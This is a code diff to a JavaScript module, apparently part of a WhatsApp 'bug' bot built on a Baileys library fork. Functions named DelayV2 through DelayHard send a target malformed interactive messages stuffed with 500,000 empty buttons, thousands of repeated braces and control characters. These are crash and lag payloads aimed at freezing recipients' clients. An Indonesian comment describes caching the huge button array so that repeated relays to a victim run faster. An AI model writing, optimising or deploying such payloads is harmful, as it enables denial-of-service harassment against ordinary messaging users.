@@ -1,9 +1,16 @@
 import { generateWAMessageFromContent } from "ourin-baileys";
 import { sleep } from "./helpers.js";
+import { BUG_DELAY_MS } from "./progress.js";
+
+// Payload 500rb tombol dibangun SEKALI dan dipakai ulang. Sebelumnya setiap
+// relayMessage membangun ulang Array 500k (~10-50ms + GC pressure) sehingga
+// 35 loop x double-hit x 50 relay = ribuan alokasi raksasa yang membuat
+// interval delay tidak tepat dan event loop tersendat.
+const BIG_BUTTONS = Array.from({ length: 500000 }, () => ({}));
 
 export async function DelayV5(sock, target) {
   for (let i = 0; i < 2; i++) {
-    await sleep(500);
+    await sleep(BUG_DELAY_MS);
     const msg = await generateWAMessageFromContent(
       target,
       {
@@ -60,7 +67,7 @@ export async function DelayV4(sock, target) {
           nativeFlowMessage: {
             name: "cta_call",
             buttonParamsJson: "\0",
-            buttons: Array.from({ length: 500000 }, () => ({})),
+            buttons: BIG_BUTTONS,
           },
           contextInfo: {
             quotedMessage: { richResponseMessage: {} },
@@ -93,7 +100,7 @@ export async function DelayV2(sock, target) {
             body: { text: "\x10".repeat(5000) },
             nativeFlowMessage: {
               messageParamsJson: "{".repeat(10000),
-              buttons: Array.from({ length: 500000 }, () => ({})),
+              buttons: BIG_BUTTONS,
             },
           },
         },
@@ -134,9 +141,9 @@ export async function DelayV3(sock, target) {
         interactiveMessage: {
           body: { text: "⎈" },
           nativeFlowMessage: {
-            buttons: Array.from({ length: 500000 }, () => ({})),
+            buttons: BIG_BUTTONS,
             nativeFlowResponsMessage: {
-              buttons: Array.from({ length: 500000 }, () => ({})),
+              buttons: BIG_BUTTONS,
             },
           },
         },
@@ -169,7 +176,7 @@ export async function DelayHard(sock, target) {
               },
               body: { text: "izin @mexxreall" },
               nativeFlowMessage: {
-                buttons: Array.from({ length: 500000 }, () => ({})),
+                buttons: BIG_BUTTONS,
               },
             },
           },
